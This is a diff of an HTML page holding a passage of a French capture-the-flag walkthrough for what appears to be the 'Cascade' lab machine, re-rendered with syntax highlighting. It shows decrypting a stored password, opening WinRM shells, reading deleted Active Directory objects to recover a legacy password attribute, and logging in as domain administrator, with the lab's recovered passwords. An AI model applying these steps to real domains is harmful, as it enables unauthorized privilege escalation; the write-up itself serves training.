+      aes.Mode <span style="color:#f92672">=</span> CipherMode.CBC;
+      aes.Key <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span>Key<span style="color:#f92672">)</span>;
       string @string;
-      using (MemoryStream memoryStream = new MemoryStream(array))
-      {
-        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
-        {
-          byte[] array2 = new byte[checked(array.Length - 1 + 1)];
-          cryptoStream.Read(array2, 0, array2.Length);
-          @string = Encoding.UTF8.GetString(array2);
-        }
-      }
-      return @string;
-    }
-}
-</code></pre>
-
-<p>Le résultat ne se fait pas attendre !</p>
-
-<pre><code class="language-bash">Hello World
+      using <span style="color:#f92672">(</span>MemoryStream memoryStream <span style="color:#f92672">=</span> new MemoryStream<span style="color:#f92672">(</span>array<span style="color:#f92672">))</span>
+      <span style="color:#f92672">{</span>
+        using <span style="color:#f92672">(</span>CryptoStream cryptoStream <span style="color:#f92672">=</span> new CryptoStream<span style="color:#f92672">(</span>memoryStream, aes.CreateDecryptor<span style="color:#f92672">()</span>, CryptoStreamMode.Read<span style="color:#f92672">))</span>
+        <span style="color:#f92672">{</span>
+          byte<span style="color:#f92672">[]</span> array2 <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>checked<span style="color:#f92672">(</span>array.Length - <span style="color:#ae81ff">1</span> + 1<span style="color:#f92672">)]</span>;
+          cryptoStream.Read<span style="color:#f92672">(</span>array2, 0, array2.Length<span style="color:#f92672">)</span>;
+          @string <span style="color:#f92672">=</span> Encoding.UTF8.GetString<span style="color:#f92672">(</span>array2<span style="color:#f92672">)</span>;
+        <span style="color:#f92672">}</span>
+      <span style="color:#f92672">}</span>
+      <span style="color:#66d9ef">return</span> @string;
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Le résultat ne se fait pas attendre !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hello World
 w3lc0meFr31nd
-</code></pre>
-
-<p><br/></p>
-
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="escalade-de-privilège-via-arksvc">Escalade de privilège via ArkSvc</h3>
-
 <p>L&rsquo;utilisateur <code>ArkSvc</code> étant également membre du groupe <code>Remote Management Users</code> on peut l&rsquo;utiliser pour se connecter via WinRM.</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell_arksvc.rb 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_arksvc.rb 
 PS &gt; whoami 
-cascade\arksvc
+cascade<span style="color:#ae81ff">\a</span>rksvc
 PS &gt; pwd
 
 Path                     
 ----                     
-C:\Users\arksvc\Documents
-</code></pre>
-
-<p>À partir de là, l&rsquo;escalade de privilège est plutôt simple. En prenant en compte l&rsquo;ensemble des éléments déjà vu et les informations récupérées durant la phase d&rsquo;énumération, on sait que l&rsquo;utilisateur <code>ArkSvc</code> contrôle le service qui s&rsquo;occupe de l&rsquo;audit et de la suppression des comptes du domaine (<code>Recycle Bin</code>).</p>
-
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments
+</code></pre></div><p>À partir de là, l&rsquo;escalade de privilège est plutôt simple. En prenant en compte l&rsquo;ensemble des éléments déjà vu et les informations récupérées durant la phase d&rsquo;énumération, on sait que l&rsquo;utilisateur <code>ArkSvc</code> contrôle le service qui s&rsquo;occupe de l&rsquo;audit et de la suppression des comptes du domaine (<code>Recycle Bin</code>).</p>
 <p>Quelques recherches sur Internet nous apprennent que lorsque de service de <code>Recycle Bin</code> est activé, il est possible entre autres de restaurer des objets supprimés. Mais il est également possible de récupérer les informations associées aux objets supprimés. La ressource suivant (<a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a>) donne tous les éléments nécessaires.</p>
-
 <p>Ainsi, la commande suivante permet d&rsquo;afficher les objets supprimés.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; Get-ADObject -Filter <span style="color:#f92672">{</span>SamAccountName -eq <span style="color:#e6db74">&#39;TempAdmin&#39;</span><span style="color:#f92672">}</span> -IncludeDeletedObjects -Properties *
 
-<pre><code class="language-bash">PS &gt; Get-ADObject -Filter {SamAccountName -eq 'TempAdmin'} -IncludeDeletedObjects -Properties *
 
-
-accountExpires                  : 9223372036854775807
-badPasswordTime                 : 0
-badPwdCount                     : 0
+accountExpires                  : <span style="color:#ae81ff">9223372036854775807</span>
+badPasswordTime                 : <span style="color:#ae81ff">0</span>
+badPwdCount                     : <span style="color:#ae81ff">0</span>
 CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059
 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 CN                              : TempAdmin
                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059
-codePage                        : 0
-countryCode                     : 0
+codePage                        : <span style="color:#ae81ff">0</span>
+countryCode                     : <span style="color:#ae81ff">0</span>
 Created                         : 1/27/2020 3:23:08 AM
 createTimeStamp                 : 1/27/2020 3:23:08 AM
 Deleted                         : True
 Description                     : 
 DisplayName                     : TempAdmin
-DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
-dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+DistinguishedName               : CN<span style="color:#f92672">=</span>TempAdmin<span style="color:#ae81ff">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+dSCorePropagationData           : <span style="color:#f92672">{</span>1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM<span style="color:#f92672">}</span>
 givenName                       : TempAdmin
-instanceType                    : 4
+instanceType                    : <span style="color:#ae81ff">4</span>
 isDeleted                       : True
-LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
-lastLogoff                      : 0
-lastLogon                       : 0
-logonCount                      : 0
+LastKnownParent                 : OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+lastLogoff                      : <span style="color:#ae81ff">0</span>
+lastLogon                       : <span style="color:#ae81ff">0</span>
+logonCount                      : <span style="color:#ae81ff">0</span>
 Modified                        : 1/27/2020 3:24:34 AM
 modifyTimeStamp                 : 1/27/2020 3:24:34 AM
 msDS-LastKnownRDN               : TempAdmin
@@ -899,38 +831,30 @@ ObjectCategory                  :
 ObjectClass                     : user
 ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
 objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
-primaryGroupID                  : 513
+primaryGroupID                  : <span style="color:#ae81ff">513</span>
 ProtectedFromAccidentalDeletion : False
-pwdLastSet                      : 132245689883479503
+pwdLastSet                      : <span style="color:#ae81ff">132245689883479503</span>
 sAMAccountName                  : TempAdmin
-sDRightsEffective               : 0
-userAccountControl              : 66048
+sDRightsEffective               : <span style="color:#ae81ff">0</span>
+userAccountControl              : <span style="color:#ae81ff">66048</span>
 userPrincipalName               : TempAdmin@cascade.local
-uSNChanged                      : 237705
-uSNCreated                      : 237695
+uSNChanged                      : <span style="color:#ae81ff">237705</span>
+uSNCreated                      : <span style="color:#ae81ff">237695</span>
 whenChanged                     : 1/27/2020 3:24:34 AM
 whenCreated                     : 1/27/2020 3:23:08 AM
-</code></pre>
-
-<p>L&rsquo;avez vous vu ? ;)
+</code></pre></div><p>L&rsquo;avez vous vu ? ;)
 De la même façon que pour le tout premier utilisateur, un attribut <code>cascadeLegacyPwd</code> est défini pour l&rsquo;utilisateur <code>TempAdmin</code>. Le mot de passe est également récupéré.</p>
-
-<pre><code class="language-bash">$ echo &quot;YmFDVDNyMWFOMDBkbGVz&quot; | base64 -d 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;YmFDVDNyMWFOMDBkbGVz&#34;</span> | base64 -d 
 baCT3r1aN00dles%                                        
-</code></pre>
-
-<p>Et là, c&rsquo;est compromis. Ha ?
+</code></pre></div><p>Et là, c&rsquo;est compromis. Ha ?
 Rappelez vous, l&rsquo;énumération avait permis de récupérer une note HTML destinée au groupe IT interne et spécifiant que le compte temporaire disposait du même mot de passe que le compte administrateur&hellip;
 Bien, on modifie alors le script ruby afin d&rsquo;y intégrer le mot de passe, et on se connecte avec le compte <code>administrator</code>.</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell_admin.rb 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_admin.rb 
 PS &gt; hostname
 CASC-DC1
 PS &gt; whoami
-cascade\administrator
-</code></pre>
-
-<p>w00ted !</p>
+cascade<span style="color:#ae81ff">\a</span>dministrator
+</code></pre></div><p>w00ted !</p>
   </div>
   
 
@@ -968,7 +892,7 @@ cascade\administrator
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
